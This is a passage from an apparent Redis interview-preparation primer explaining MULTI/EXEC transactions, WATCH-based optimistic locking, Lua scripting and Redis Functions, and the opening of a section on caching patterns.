- **`MULTI`** — starts the transaction. Every command after it is *queued* (Redis replies `QUEUED`), not executed.
- **`EXEC`** — runs all queued commands in order, atomically, and returns an array with each command's reply.
- **`DISCARD`** — abandons the transaction, flushes the queue, and returns to normal state.

```bash
MULTI
SET account:alice 100      # QUEUED
INCR account:alice         # QUEUED
EXEC                       # runs both atomically -> [OK, 101]
```

Because Redis is single-threaded, once EXEC starts, nothing runs between those commands. That's the isolation guarantee — you get it for free from the execution model.

### Q2. If one command in a MULTI/EXEC fails, do the others roll back?

**No — and this is the #1 gotcha.** Redis does not roll back. There are two distinct failure cases:

**Case 1 — error detected at queue time (before EXEC):** a syntax error or unknown command. Redis flags the transaction as broken, and `EXEC` refuses to run the whole thing (returns an error / aborts). This is the *safe* case.

```bash
MULTI
SET k 1
INBALIDCMD k             # error: command not recognized -> transaction marked dirty
EXEC                     # EXECABORT: transaction discarded, nothing runs
```

**Case 2 — error at EXEC time (runtime error):** the command was valid at queue time but fails when run — e.g. running `INCR` on a key holding a non-integer string. EXEC executes everything; the bad command returns an error *in the results array*, and **all the other commands still take effect.**

```bash
SET mystr "hello"
MULTI
SET a 1                  # QUEUED
INCR mystr              # QUEUED (valid syntax)
SET b 2                 # QUEUED
EXEC
# -> [OK, (error) not an integer, OK]   <- a and b ARE set. No undo.
```

Redis's rationale: only *programming errors* (wrong type, wrong arity) cause EXEC-time failures, and those should be caught in testing; skipping rollback keeps Redis simple and fast. But you must not rely on SQL-style atomic-rollback semantics.

### Q3. Why doesn't Redis roll back transactions?

The Redis docs give two reasons:

1. **A command in a transaction fails only from a programming error** — using the wrong type on a key, or wrong number of arguments. These are bugs that should surface in development, not conditions to recover from at runtime.
2. **Rollback would add significant complexity** to Redis's internals and slow it down, contradicting the design goal of being simple and fast.

So the trade-off is deliberate: Redis chooses speed and simplicity over ACID durability-of-failure. If you need "undo half-applied changes on a logical error," you handle it in application logic or, better, use a **Lua script** that validates before it writes — a script can check preconditions and simply not perform the writes if they don't hold.

### Q4. What is WATCH and how does it enable optimistic locking?

`WATCH` marks one or more keys so that the subsequent `MULTI`/`EXEC` becomes **conditional**: if any watched key is modified by another client *before* your `EXEC`, the EXEC is aborted and returns **nil**, executing nothing. You then retry.

This is **optimistic locking / check-and-set (CAS)**: you don't lock the key or block other clients — you *assume* no conflict, and Redis *detects* one for you at commit time.

```bash
WATCH balance:alice
val = GET balance:alice        # read current value in the client
# ... compute new value in app code ...
MULTI
SET balance:alice <newval>
EXEC                           # nil if balance:alice changed since WATCH -> retry
```

If EXEC returns nil, someone else wrote `balance:alice` in the meantime; loop back, re-WATCH, re-read, recompute, retry. It's "optimistic" because you only pay a cost (a retry) *when* there's contention — under low contention it's basically free and never blocks.

### Q5. Show the canonical WATCH / MULTI / EXEC retry loop.

The pattern for a safe read-modify-write. Pseudocode:

```text
while true:
    WATCH key
    current = GET key
    if not valid(current):
        UNWATCH
        break / handle
    next = compute(current)
    MULTI
    SET key next
    result = EXEC
    if result != nil:      # success: no one touched key
        break
    # else EXEC returned nil -> conflict, loop and retry
```

Key points: you **read after WATCH** (so you're watching the value you based your decision on), you build the write inside MULTI, and a **nil EXEC means retry**. Always `UNWATCH` (or let EXEC/DISCARD clear it) if you bail out early, so you don't leave keys watched on the connection. In practice, WATCH is exactly how you'd implement "increment a counter only if it's below a limit" or "move money between two accounts" without a Lua script — though Lua is usually cleaner (see Q13).

### Q6. What's the difference between optimistic (WATCH) and pessimistic locking?

| | Optimistic (WATCH) | Pessimistic (e.g. `SET NX` lock) |
|---|---|---|
| Assumption | Conflicts are rare | Conflicts are likely |
| Blocking | Never blocks other clients | Holds a lock; others wait |
| Cost model | Cheap unless conflict → retry | Always pays lock overhead |
| Failure mode | EXEC returns nil → retry loop | Lock timeout / contention stalls |
| Best when | Low contention, short critical section | High contention or long critical section |
| Deadlock risk | None (no held locks) | Yes (must set TTLs, order locks) |

WATCH is great for hot-but-not-that-hot keys where you'd rather retry occasionally than serialize everyone. Under heavy contention, optimistic retries can livelock (everyone keeps conflicting) — then a pessimistic lock or a single-threaded Lua script (which serializes the operation server-side) wins.

### Q7. What does UNWATCH do, and when do you need it?

`UNWATCH` clears **all** keys you've WATCHed on the current connection, without executing anything. You need it when you WATCH keys but then decide *not* to proceed with a transaction — for example your read shows the value is already what you want, so there's nothing to write.

```bash
WATCH stock:item42
n = GET stock:item42
if n == 0:
    UNWATCH          # nothing to do; stop watching so future ops aren't affected
```

Note: `EXEC` and `DISCARD` both automatically UNWATCH. So you only call UNWATCH explicitly on the "I looked but I'm not going to run a MULTI/EXEC" path. Leaving keys watched on a pooled/reused connection is a subtle bug — a later unrelated EXEC could spuriously abort.

### Q8. Redis transactions and ACID — which properties actually hold?

- **Atomicity** — *partial*. Commands run as an uninterrupted unit (all-or-none *interleaving*), but there is **no rollback** on a runtime error, so it's not SQL-atomic. If a queueing error occurs, the whole thing is discarded (that part is atomic).
- **Consistency** — you keep your data structures consistent, but Redis enforces no constraints; it's on you.
- **Isolation** — **yes, strong.** Single-threaded execution means no other command interleaves during EXEC. WATCH adds serializability against concurrent writers.
- **Durability** — depends on persistence config (AOF `appendfsync always` gives the strongest guarantee; `everysec` can lose ~1s; RDB-only can lose more). Not a property of transactions per se.

So the honest interview answer: "**Isolation yes, atomicity only in the interleaving sense (no rollback), consistency and durability are your responsibility / config-dependent.**"

### Q9. Can I make a decision based on a value inside a MULTI/EXEC block?

**No.** Inside a transaction the commands are queued and not executed until EXEC, so you can't read a value and branch on it *within* the same transaction — there are no results to branch on yet. This is a fundamental limit of MULTI/EXEC.

Your options:

1. **WATCH + client-side logic** — read the value *before* MULTI, decide in your app, and let WATCH abort if it changed. Works, but requires a retry loop.
2. **Lua script (`EVAL`)** — the right tool for conditional logic. A script executes atomically and *can* use the result of one command to decide the next:

```lua
-- decrement stock only if > 0, atomically
local n = tonumber(redis.call('GET', KEYS[1]))
if n and n > 0 then
  return redis.call('DECR', KEYS[1])
else
  return -1
end
```

If your "transaction" needs an `if`, that's the signal to move from MULTI/EXEC to Lua.

### Q10. Write a safe transfer between two counters using WATCH.

Move amount from `account:alice` to `account:bob`, failing if alice is short, without a lock:

```text
while true:
    WATCH account:alice account:bob
    a = tonumber(GET account:alice)
    if a < amount:
        UNWATCH
        return "insufficient funds"
    MULTI
    DECRBY account:alice amount
    INCRBY account:bob   amount
    if EXEC != nil:
        return "ok"          # both applied atomically
    # nil -> someone changed alice or bob; retry
```

Both keys are watched, so a concurrent write to *either* aborts the EXEC and you retry with fresh reads. The DECRBY/INCRBY pair runs atomically at EXEC, so no one ever observes money having left alice but not yet arrived at bob. (In Redis Cluster both keys must hash to the same slot — see Q12 — otherwise use a hash tag like `account:{group1}:alice`.)

### Q11. How do transactions interact with pipelining?

They're orthogonal but often combined:

- **Pipelining** batches multiple commands in one network write to cut round-trip latency. It gives **no atomicity and no isolation** — the commands just get sent together and executed in order, but other clients' commands can interleave.
- **Transactions** (`MULTI`/`EXEC`) give atomicity/isolation but each command is still a request/reply.

You typically **pipeline the transaction** to avoid a round-trip per queued command: send `MULTI`, all the queued commands, and `EXEC` in a single pipeline flush. Most client libraries do this automatically when you use their transaction/pipeline API. So the mental split is: *pipelining = network optimization; MULTI/EXEC = execution semantics.* Combining them = one round trip AND atomic execution.

### Q12. How do transactions work in Redis Cluster?

In Cluster mode, a transaction can only touch keys that live in the **same hash slot** — because a transaction runs on a single node and the node must own all the keys. If your MULTI/EXEC references keys spanning multiple slots, you get a `CROSSSLOT` error.

The fix is **hash tags**: wrap a common substring in `{...}` and only that part is hashed, forcing keys into the same slot:

```bash
# without tags these may land on different nodes:
#   account:alice  account:bob   -> CROSSSLOT risk
# with a shared hash tag they share a slot:
MULTI
DECRBY account:{tenant42}:alice 10
INCRBY account:{tenant42}:bob   10
EXEC
```

Same rule applies to multi-key commands generally (`MGET`, `SINTERSTORE`) and to Lua scripts in Cluster. Design your keyspace so keys you need to mutate together share a hash tag from the start.

### Q13. When should I use MULTI/EXEC versus a Lua script?

| Use MULTI/EXEC when… | Use Lua (`EVAL`) when… |
|---|---|
| You just need a fixed batch run atomically | You need conditional logic / branching |
| No decision depends on intermediate values | You must use one command's result to decide the next |
| WATCH-based CAS is sufficient | You want atomic read-modify-write in one round trip |
| You want it fully client-portable | You want to avoid the WATCH retry loop under contention |

In practice, **for anything beyond a simple batch, prefer Lua.** A script runs atomically (single-threaded, nothing interleaves), can branch on values, and completes in a single round trip with no retry loop. The classic example is "increment only if under a limit" — trivial in Lua, awkward with WATCH. MULTI/EXEC earns its keep for straightforward "do these N writes together" cases and when you want to stay in pure Redis commands without shipping code.

### Q14. What exactly does EXEC return?

`EXEC` returns an **array**, one element per queued command, in order — each element being that command's normal reply.

```bash
MULTI
SET a 1       # QUEUED
INCR a        # QUEUED
GET a         # QUEUED
EXEC
# 1) OK
# 2) (integer) 2
# 3) "2"
```

Two special cases: (1) if a watched key changed, EXEC returns **nil** (the whole transaction aborted, nothing ran); (2) if a command errored at runtime, that element holds an **error reply** while the rest still ran (no rollback — see Q2). Your client should inspect each element; a nil top-level result means "retry," and per-element errors mean "a command failed but others applied."

### Q15. Spot the bug: this "atomic" counter update.

```text
val = GET counter          # returns "10"
newval = val + 1           # 11 computed in app
MULTI
SET counter newval
EXEC
```

**The bug: this is not atomic at all.** The `GET` happens *before* MULTI, with no `WATCH`, so between reading `10` and running EXEC another client can also read `10`, compute `11`, and write it — and you overwrite each other. Classic lost-update race. Wrapping only the `SET` in MULTI/EXEC protects nothing; a single `SET` is already atomic.

Two correct fixes:

1. **Just use `INCR`** — it's atomic read-modify-write by itself: `INCR counter`. No transaction needed. Always prefer the native atomic command when one exists.
2. If the update is more complex than `+1`, use **WATCH** on `counter` before the GET (so EXEC aborts on concurrent change), or a **Lua script**. The lesson: MULTI/EXEC gives isolation *within* the block, not across your earlier client-side read.

## Lua Scripting & Functions

### Summary

**What this topic covers**

How to run your own logic *inside* Redis, atomically. Three concern areas: (1) **Lua scripting** — `EVAL`/`EVALSHA`, the `KEYS`/`ARGV` convention, `redis.call` vs `redis.pcall`, type conversion, and script caching with `SCRIPT LOAD`; (2) **the atomicity property and its cost** — a script runs as one uninterrupted unit (great: true atomic read-modify-write; dangerous: it *blocks the whole single-threaded server* for its entire duration); and (3) **Redis Functions** — the Redis 7 successor that registers named functions in libraries persisted with the dataset. The 15 questions cover why Lua is *the* way to get atomic compound operations (a rate limiter, a safe distributed-lock release, "increment if under limit"), the long-running-script footgun and how to survive it (`SCRIPT KILL`, `lua-time-limit`), and how Functions differ from ephemeral EVAL scripts.

**Mental model**

A Lua script is a **stored procedure that Redis runs atomically on its single thread**. Because Redis executes one thing at a time, from the moment your script starts until it returns, *nothing else runs on the server* — no other client's commands, no expiry processing. That is the superpower and the danger in one sentence. The superpower: you get genuine atomic read-modify-write and can branch on intermediate results (something MULTI/EXEC cannot). Write "check the count, and only if it's under the limit, increment and set a TTL" as one script and it's race-free. The danger: a slow script (a big loop, an O(N) over a huge key) freezes every client. So the rule is *keep scripts short, deterministic, and O(reasonable)*. Pass every key the script touches via `KEYS[]` (not hardcoded) so it's Cluster-correct, and everything else via `ARGV[]`. Cache scripts by SHA so you send `EVALSHA <sha>` instead of the whole body each time.

**Key terms**

- **`EVAL script numkeys key... arg...`** — run a Lua script; `numkeys` splits KEYS from ARGV.
- **`EVALSHA sha1 ...`** — run a cached script by its SHA1 (saves bandwidth).
- **`SCRIPT LOAD`** — cache a script without running it; returns its SHA1.
- **`KEYS[]`** — the array of keys the script accesses (for Cluster routing & clarity).
- **`ARGV[]`** — non-key arguments (values, limits, tokens).
- **`redis.call()`** — run a Redis command; a command error aborts the script and propagates.
- **`redis.pcall()`** — like call but returns the error as a table instead of aborting.
- **Atomic execution** — the whole script runs with no interleaving (single-threaded).
- **`lua-time-limit` / busy-reply-threshold** — ms after which Redis replies BUSY to other clients.
- **`SCRIPT KILL`** — kill a running script that hasn't written yet.
- **Redis Functions** — Redis 7 named functions in libraries, persisted & replicated with the data.
- **`FUNCTION LOAD`** — register a function library on the server.

**Why interviewers ask this**

Lua scripting is the dividing line between "I use Redis as a dumb cache" and "I use Redis as a programmable data structure server." Interviewers ask it to see if you know **how to get true atomicity for compound operations** — the correct answer to "how do you safely release a distributed lock" or "how do you build a token-bucket rate limiter" is almost always a Lua script, and candidates who reach for GET-then-DEL or GET-then-INCR reveal a race-condition blind spot. The senior signal is knowing the *cost*: that a script blocks the whole server, so it must be short and deterministic, plus awareness of the modern **Redis Functions** replacement. It also tests understanding of the single-threaded model from a different angle than transactions do.

**Common confusions**

- "A Lua script and a MULTI/EXEC are equivalent" — no; Lua can branch on intermediate values and do real conditional read-modify-write, which MULTI/EXEC cannot.
- "Scripts run in parallel / in the background" — no; they run on the one main thread and **block everything** until they return.
- "I can hardcode key names in the script" — you can, but it breaks Cluster routing and clarity; pass them via `KEYS[]`.
- "`redis.call` and `redis.pcall` are interchangeable" — `call` aborts the script on a command error; `pcall` lets you handle it.
- "Random/time inside a script is fine" — historically non-determinism broke replication; scripts should be deterministic (Redis provides `redis.sha1hex`, controlled randomness, etc.).
- "EVAL scripts are stored on the server permanently" — the script *cache* is ephemeral (cleared on restart/`SCRIPT FLUSH`); **Functions** are what persist with the dataset.

**What follows from this topic**

Lua is the engine behind several patterns elsewhere in this primer: the **safe distributed-lock release** (compare-token-then-DEL as one atomic script), the **token-bucket / sliding-window rate limiter**, and any "increment if under limit" quota check. It's also the escape hatch from the previous topic's limitation — when MULTI/EXEC and WATCH can't express conditional logic without a retry loop, a script can. And Redis Functions point toward treating Redis as an application platform, the same direction as Redis Stack modules. The single-threaded atomicity you exploit here is the same property that makes O(N) commands a latency hazard — keep scripts fast.

### Q1. How do you run a Lua script in Redis? Explain EVAL's arguments.

Use `EVAL`:

```bash
EVAL "return redis.call('SET', KEYS[1], ARGV[1])" 1 mykey myvalue
```

The signature is `EVAL <script> <numkeys> <key1> ... <keyN> <arg1> ... <argM>`:

- **`<script>`** — the Lua source as a string.
- **`<numkeys>`** — how many of the following arguments are *keys*. This is the split point.
- **the first `numkeys` args** — populate the `KEYS[]` table (1-indexed in Lua).
- **the rest** — populate the `ARGV[]` table.

So above, `1` says "one key," `mykey` becomes `KEYS[1]`, and `myvalue` becomes `ARGV[1]`. The script returns whatever the final `return` yields (converted to a Redis reply). The whole thing executes **atomically** — nothing else runs on the server until it returns.

### Q2. Why is a Lua script atomic, and why does that matter?

Because Redis is **single-threaded**: it runs one command (or one script) at a time on its event loop. From the instant your script begins until it returns, no other client command executes and no expiry runs. So the entire script is one indivisible unit.

Why it matters: it's the **only clean way to do atomic multi-step read-modify-write where a later step depends on an earlier step's result**. MULTI/EXEC can't branch on intermediate values; a script can:

```lua
-- atomic "increment only if under limit"
local n = tonumber(redis.call('GET', KEYS[1]) or '0')
if n < tonumber(ARGV[1]) then
  return redis.call('INCR', KEYS[1])
end
return -1
```

No other client can slip in between the `GET` and the `INCR`, so the check-and-increment is race-free. This is why rate limiters, quota checks, and safe lock releases are written in Lua.

### Q3. What's the KEYS vs ARGV convention and why does it matter?

**All keys the script reads or writes go through `KEYS[]`; everything else goes through `ARGV[]`.**

```bash
EVAL "return redis.call('SET', KEYS[1], ARGV[1])" 1 session:abc token123
#                                                  ^numkeys=1
#                                         KEYS[1]=session:abc  ARGV[1]=token123
```

Two reasons:

1. **Cluster correctness** — Redis Cluster routes a script to the node owning its keys and verifies all keys map to one slot. It can only do that if you *declare* the keys via `numkeys`/`KEYS[]`. Hardcoding a key name in the script body hides it from the router and breaks in Cluster.
2. **Clarity & reuse** — the same script works on different keys without editing its body; readers see exactly which keys it touches.

Rule of thumb: if the script accesses a key, it must arrive in `KEYS[]`. Never build key names by concatenating ARGV inside the script in Cluster mode.

### Q4. redis.call vs redis.pcall — what's the difference?

Both run a Redis command from inside the script. The difference is **error handling**:

- **`redis.call()`** — if the command errors (e.g. wrong type), it **raises an error that aborts the whole script** and propagates back to the client. Use this when an error should just fail the operation.
- **`redis.pcall()`** ("protected call") — catches the error and **returns it as a Lua table** (`{err = "..."}`) instead of aborting, so the script can inspect it and decide what to do.

```lua
local ok = redis.pcall('INCR', KEYS[1])
if type(ok) == 'table' and ok.err then
  -- handle gracefully, maybe reset the key
  redis.call('SET', KEYS[1], 0)
  return 0
end
return ok
```

Default to `redis.call` (fail fast); reach for `pcall` only when you genuinely want to recover from a command error mid-script.

### Q5. How do Lua and Redis types convert when returning values?

Redis converts between Lua types and RESP replies. Key mappings you must remember:

- Lua **number** → Redis **integer** (the fractional part is **truncated** — `return 3.9` yields `3`). To return a float, return it as a string.
- Lua **string** → Redis **bulk string**.
- Lua **table** (array part) → Redis **array**; conversion stops at the first `nil`.
- Lua **`false` / `nil`** → Redis **nil** (null reply).
- Lua **`true`** → Redis integer `1`.
- Lua table `{ok = "..."}` → Redis **status reply**; `{err = "..."}` → Redis **error reply**.

The two classic traps: **floats get truncated to ints**, and a **`nil` in the middle of a table truncates the array** (so build result arrays carefully). Since RESP3, Redis can also map more types, but knowing the truncation gotchas is what interviews probe.

### Q6. Why are long-running scripts dangerous, and how do you handle one?

Because a script **blocks the entire single-threaded server for its whole duration** — every other client is stalled until it returns. A script with a big loop, or one that does an O(N) operation over a huge collection, is effectively a global stop-the-world pause. This is the scripting equivalent of running `KEYS *` — a latency killer.

Guardrails:

- **`lua-time-limit`** (a.k.a. `busy-reply-threshold`, default 5000ms) — after this long, Redis starts replying `-BUSY` to *other* clients (it doesn't kill the script; it warns).
- **`SCRIPT KILL`** — kills a busy script **only if it hasn't performed a write yet** (killing after a write would leave inconsistent state, so that's disallowed).
- **`SHUTDOWN NOSAVE`** — the nuclear option if the script already wrote and is wedged.

Prevention beats cure: keep scripts short, avoid unbounded loops, don't iterate huge keys inside a script, and never call blocking commands (`BLPOP` etc.) from Lua.

### Q7. How does script caching work (SCRIPT LOAD / EVALSHA)?

To avoid shipping the full script body over the wire on every call, Redis caches scripts by their **SHA1**:

```bash
SCRIPT LOAD "return redis.call('INCR', KEYS[1])"
# -> "a1b2c3...sha1"
EVALSHA a1b2c3...sha1 1 counter        # run by hash, tiny payload
```

- **`SCRIPT LOAD`** — compiles and caches the script, returns its SHA1, but does *not* run it.
- **`EVALSHA <sha> ...`** — runs the cached script. If the server doesn't have it (cache was flushed, or a failover to a fresh node), you get a `NOSCRIPT` error.
- **`SCRIPT EXISTS <sha> ...`** — check which SHAs are cached (returns 1/0 per SHA).
- **`SCRIPT FLUSH`** — clears the whole cache.

Standard client pattern: try `EVALSHA`; on `NOSCRIPT`, fall back to `EVAL` (which also caches it). Note `EVAL` itself caches, so the SHA is available afterward. The cache is **ephemeral** — it doesn't survive restart and isn't part of your dataset (that's what Functions are for).

### Q8. Write a Lua token-bucket rate limiter.

A token bucket: each key refills at a rate up to a capacity; a request consumes a token if available. Doing the read-refill-consume atomically is exactly what Lua is for.

```lua
-- KEYS[1] = bucket key
-- ARGV[1] = capacity, ARGV[2] = refill_per_sec, ARGV[3] = now (sec), ARGV[4] = requested
local cap    = tonumber(ARGV[1])
local rate   = tonumber(ARGV[2])
local now    = tonumber(ARGV[3])
local want   = tonumber(ARGV[4])

local data = redis.call('HMGET', KEYS[1], 'tokens', 'ts')
local tokens = tonumber(data[1]) or cap
local ts     = tonumber(data[2]) or now

-- refill based on elapsed time
tokens = math.min(cap, tokens + (now - ts) * rate)

local allowed = tokens >= want
if allowed then tokens = tokens - want end

redis.call('HMSET', KEYS[1], 'tokens', tokens, 'ts', now)
redis.call('EXPIRE', KEYS[1], math.ceil(cap / rate) * 2)
return allowed and 1 or 0
```

Because the whole refill-check-consume runs atomically, two concurrent requests can never both consume the last token. This is the standard production rate-limiter shape.

### Q9. Write the correct way to release a distributed lock with Lua.

The naive unlock — `GET lock` then `DEL lock` — has a race: between your GET and DEL, your lock could have expired and been re-acquired by someone else, and your DEL would delete *their* lock. The fix is **compare-token-then-delete, atomically**:

```lua
-- KEYS[1] = lock key, ARGV[1] = my unique token
if redis.call('GET', KEYS[1]) == ARGV[1] then
  return redis.call('DEL', KEYS[1])
else
  return 0
end
```

Paired with acquisition via `SET lock <token> NX PX <ttl>` (a unique token per holder), this guarantees you only delete the lock **if you still own it**. Because the script is atomic, no one can grab the lock between the compare and the delete. This is the canonical safe-unlock and a very common interview ask — reaching for plain `DEL` is the wrong answer.

### Q10. Write an "increment if under limit" atomic counter.

A fixed-window quota: allow up to `limit` increments, atomically.

```lua
-- KEYS[1] = counter, ARGV[1] = limit, ARGV[2] = ttl_seconds
local cur = tonumber(redis.call('GET', KEYS[1]) or '0')
if cur < tonumber(ARGV[1]) then
  local n = redis.call('INCR', KEYS[1])
  if n == 1 then
    redis.call('EXPIRE', KEYS[1], ARGV[2])   -- set TTL on first increment
  end
  return n            -- allowed
end
return -1             -- over limit, rejected
```

The check-then-increment is race-free because it's one atomic script — you can't have two clients both read `cur == limit-1` and both increment. Setting the TTL only on the first increment (`n == 1`) gives you a rolling fixed window. This is the simplest correct rate limiter and a frequent whiteboard question.

### Q11. What are Redis Functions and how do they differ from EVAL scripts?

**Redis Functions** (Redis 7+) are the modern successor to EVAL scripting. You register a **library** of named functions on the server with `FUNCTION LOAD`, then call them by name with `FCALL`:

```bash
FUNCTION LOAD "#!lua name=mylib
redis.register_function('myfunc', function(keys, args)
  return redis.call('GET', keys[1])
end)"

FCALL myfunc 1 mykey
```

Differences from EVAL scripts:

| | EVAL scripts | Redis Functions |
|---|---|---|
| Naming | Anonymous (SHA1) | Named functions in named libraries |
| Persistence | Ephemeral cache (lost on restart/flush) | **Persisted with the dataset** (RDB/AOF) |
| Replication | Effects replicated per call | Library **replicated** to replicas |
| Shipping | Client ships script body/SHA | Loaded once, part of the server |
| Intended use | Ad-hoc atomic ops | First-class server-side application logic |

The big win: Functions are **part of your database** — they survive restarts, replicate to replicas, and don't need the client to carry the script. They're the intended direction for durable server-side logic; EVAL remains fine for one-off atomic operations.

### Q12. How do scripts interact with replication and AOF?

Modern Redis uses **effects replication** (a.k.a. script-effects replication): rather than shipping the script to replicas/AOF and re-running it, Redis replicates the **actual write commands the script executed**. So if your script does `SET`, `INCR`, `DEL`, those concrete effects are what get sent to replicas and appended to the AOF.

Why this matters:

- It makes **non-determinism safe** — even if a script used something time- or random-based, replicas get the exact same resulting writes rather than potentially diverging by re-executing. (Historically, before effects replication, scripts had to be strictly deterministic to avoid replica drift.)
- Read-only scripts replicate nothing.

Practical takeaway: you generally don't have to worry about determinism for replication anymore, but keeping scripts deterministic and side-effect-clear is still good hygiene — and required if you ever run older replication modes.

### Q13. How do Lua scripts behave in Redis Cluster?

Same rule as multi-key commands and transactions: **all keys a script touches must hash to the same slot**, because the script runs on a single node that must own every key it accesses.

- Declare all keys via `KEYS[]`/`numkeys` so the client and Cluster can route correctly and validate the slot. A script that accesses an undeclared key, or keys spanning slots, errors (`CROSSSLOT`) or misbehaves.
- Use **hash tags** `{...}` to co-locate keys you need together: `bucket:{user42}` and `meta:{user42}` share a slot.

```bash
EVALSHA <sha> 2 rate:{user42} meta:{user42} 100 60
```

Never construct a second key name from ARGV inside the script in Cluster mode — the router won't know about it, and it may live on another node.

### Q14. When should you use Lua vs MULTI/EXEC vs a Redis module?

- **Lua (`EVAL`/Functions)** — the default for **atomic compound logic**: read-modify-write with branching, rate limiters, safe lock release, conditional updates. Runs atomically, one round trip, can branch on values.
- **MULTI/EXEC** — a **fixed batch** of commands run atomically with no need to branch on intermediate results; or WATCH-based CAS. Simpler, fully portable, no code shipped, but no conditional logic.
- **A module** (e.g. RedisJSON, RediSearch, or a custom C module) — when you need **new data types, secondary indexes, or heavy computation** that Lua can't express efficiently or that would run too long. Modules are native C, far faster for complex work, but require deployment and can't be shipped per-request.

Escalation ladder: native command → MULTI/EXEC → Lua/Functions → module. Move up only when the level below can't express the operation atomically or fast enough.

### Q15. Spot the bug: this unlock script / pattern.

```bash
# acquire
SET lock:job token-xyz NX PX 30000
# ... do work ...
# release
DEL lock:job
```

**The bug: the release is unconditional.** If your work took longer than the 30s TTL, the lock **expired** and another client may have acquired `lock:job` with *its own* token. Your blind `DEL lock:job` then deletes **someone else's lock**, letting a third client in — mutual exclusion broken.

**Fix:** release with an atomic compare-token-then-delete (Q9):

```lua
if redis.call('GET', KEYS[1]) == ARGV[1] then
  return redis.call('DEL', KEYS[1])
end
return 0
```

Called as `EVALSHA <sha> 1 lock:job token-xyz`, this only deletes the lock **if you still hold it**. Two deeper caveats to mention: even this isn't safe for correctness-critical mutual exclusion without **fencing tokens** (the Kleppmann critique of Redlock), and you should size the TTL above your worst-case work time or use a watchdog to extend it.

## Caching Patterns

### Summary

**What this topic covers**

The #1 reason Redis exists in most stacks — putting a fast in-memory layer in front of a slower primary store — and all the ways that goes wrong. Three concern areas: (1) **the write/read strategies** — cache-aside (lazy loading, the default), read-through, write-through, and write-behind, and when each fits; (2) **invalidation and TTLs** — the genuinely hard problem of keeping cache and source-of-truth in sync (TTL expiry vs explicit delete-on-write vs event-driven), plus TTL jitter; and (3) **the failure modes** — cache stampede/thundering herd, cache penetration, and cache avalanche, with their standard mitigations. The 18 questions go deep because this is where senior candidates are separated: anyone can `GET`/`SET`, but knowing how to protect a hot key from a stampede, how to handle a key that doesn't exist, and how to reason about cache/DB consistency is the real skill. Client-side caching, hit-rate measurement, and a full "design a cache layer" answer round it out.

**Mental model**

A cache is a **bet that recent/expensive reads will repeat**, traded against **staleness and an extra system to keep coherent**. Start from cache-aside: the application is in charge — on a read it checks Redis first (a **hit** returns fast), and on a **miss** it loads from the DB, writes the result into Redis with a **TTL**, and returns. Everything else is a variation on *who writes the cache and when*, and *how you deal with the cache being wrong*. The two eternal problems are **invalidation** (the cache says X, the DB now says Y) and **the stampede** (a hot key expires and a thundering herd of requests all miss and hammer the DB at once). Almost every advanced caching technique is a defense against one of those. And always assume the cache can vanish — design so a cold or failed cache degrades to "slower," not "broken." TTL is your safety net even when you also invalidate explicitly.

**Key terms**

- **Cache-aside (lazy loading)** — app checks cache, loads from DB on miss, populates cache. The default.
- **Read-through** — the cache layer itself loads from the DB on miss, hiding it from the app.
- **Write-through** — write to cache and DB together on every write; cache always fresh, slower writes.
- **Write-behind (write-back)** — write to cache, async-flush to DB later; fast writes, risk of loss.
- **TTL** — per-key expiry; the universal safety net against unbounded staleness.
- **Invalidation** — removing/updating a cached entry when the source changes.
- **Cache stampede / thundering herd** — many concurrent misses on one expired hot key hit the DB at once.
- **Cache penetration** — repeated misses for keys that don't exist in the DB either.
- **Cache avalanche** — many keys expiring together (or cache down) flooding the DB.
- **TTL jitter** — randomizing TTLs so keys don't expire in sync.
- **Single-flight / mutex** — let only one request recompute a key; others wait or serve stale.
- **Hit rate** — fraction of reads served from cache; the primary health metric.

**Why interviewers ask this**

Caching is the most common real Redis use, so it's the most common thing to be grilled on. Junior candidates describe `GET`/`SET` and stop. Senior candidates name the pattern (cache-aside), attach a TTL as a matter of reflex, and — crucially — anticipate the failure modes: "what happens when this hot key expires under load?" (stampede), "what if someone queries an ID that doesn't exist?" (penetration), "what if all these keys expire at 3am together?" (avalanche). The interviewer is checking whether you've *operated* a cache, not just read about one. The consistency discussion ("cache invalidation is one of the two hard problems in CS") reveals whether you understand that a cache is an eventually-consistent copy and how you bound the divergence. A strong "design a cache layer for a read-heavy service" answer ties it all together.

**Common confusions**

- "Cache-aside and read-through are the same" — both lazy-load on miss, but in cache-aside the *app* loads the DB; in read-through the *cache layer* does.
- "Write-through keeps everything consistent" — it keeps the cache fresh on writes, but adds write latency and doesn't help if reads populate stale data another way.
- "Just delete the key on write and you're consistent" — there's still a race window, and delete-vs-update is a real choice with trade-offs.
- "A TTL solves stampede" — no; the *moment* a hot key's TTL fires, the herd hits at once. TTL alone can *cause* stampede/avalanche without jitter/locking.
- "Cache everything" — cold/rarely-read data wastes memory and hurts hit rate; cache hot, expensive, read-heavy data.
- "Negative results don't need caching" — repeated lookups of nonexistent keys (penetration) can hammer the DB; cache the null too.

**What follows from this topic**

Caching ties every other Redis topic together: **TTLs and eviction** (a cache is where `maxmemory` + `allkeys-lru`/`lfu` policies earn their keep — you *want* eviction here, unlike a primary store), **single-flight stampede protection** is implemented with a **distributed lock** (`SET NX`) or a **Lua script**, **negative-caching / existence checks** connect to Bloom filters (RedisBloom), and **client-side caching** builds on RESP3 tracking. The consistency reasoning here — that the cache is an eventually-consistent replica of the source of truth — is the same reasoning behind replication lag and read-your-writes elsewhere in this primer. If you understand cache-aside, invalidation, and stampede protection, you understand 80% of how Redis is actually deployed.

### Q1. Why cache at all? What does a cache buy you?

Three things:

1. **Lower latency** — an in-memory `GET` from Redis is sub-millisecond; a DB query with joins/disk might be tens of milliseconds. For read-heavy paths this is a 10–100x speedup on the hot path.
2. **Offload the primary store** — every read served from cache is a read the database *doesn't* do. This protects an expensive/limited primary (especially one with slow queries or a connection ceiling) and lets it scale further.
3. **Absorb read spikes** — a viral item or a traffic burst hits one hot cache key instead of stampeding the DB. Redis handles enormous read throughput on a single key.

The cost side: you now run an extra system, tolerate some staleness, and must handle invalidation and failure modes. The bet only pays off when reads dominate writes and the same data is read repeatedly — which is true for most web workloads (user profiles, product catalogs, sessions, rendered fragments).

### Q2. Explain the cache-aside (lazy-loading) pattern.

The default caching pattern. The **application** owns the cache; Redis is a side store:

```text
read(key):
    val = redis.GET(key)
    if val is not None:        # HIT
        return val
    val = db.query(key)        # MISS: go to source of truth
    redis.SET(key, val, EX=ttl)  # populate cache with a TTL
    return val
```

```bash
GET user:123            # (nil)  -> miss
# ... load from DB ...
SET user:123 "{...}" EX 300     # cache for 5 min
```

